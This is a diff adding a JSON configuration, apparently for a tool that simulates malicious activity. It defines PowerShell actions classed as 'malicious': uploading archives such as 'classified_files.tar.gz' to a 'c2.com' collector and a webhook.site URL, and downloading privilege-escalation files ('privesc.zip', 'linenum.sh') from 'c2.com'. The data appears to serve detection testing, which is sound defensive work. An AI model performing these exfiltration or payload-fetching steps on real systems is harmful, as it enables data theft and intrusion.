@@ -1,0 +1,32 @@
+[
+    {
+        "name": "Upload file",
+        "classification": "malicious",
+        "clock": "",
+        "module": "powershell",
+        "method": "upload_file",
+        "options": [
+            [
+                "https://c2.com/collector",
+                "https://webhook.site/#!/5e31bc6a-6bda-4411-b138-d65a33ed7277"
+            ],
+            [
+                "documents.zip",
+                "classified_files.tar.gz"
+            ]
+        ]
+    },
+    {
+        "name": "Download file",
+        "classification": "malicious",
+        "clock": "",
+        "module": "powershell",
+        "method": "download_file",
+        "options": [
+            [
+                "https://c2.com/privesc.zip",
+                "https://c2.com/linenum.sh"
+            ]
+        ]
+    }
+]
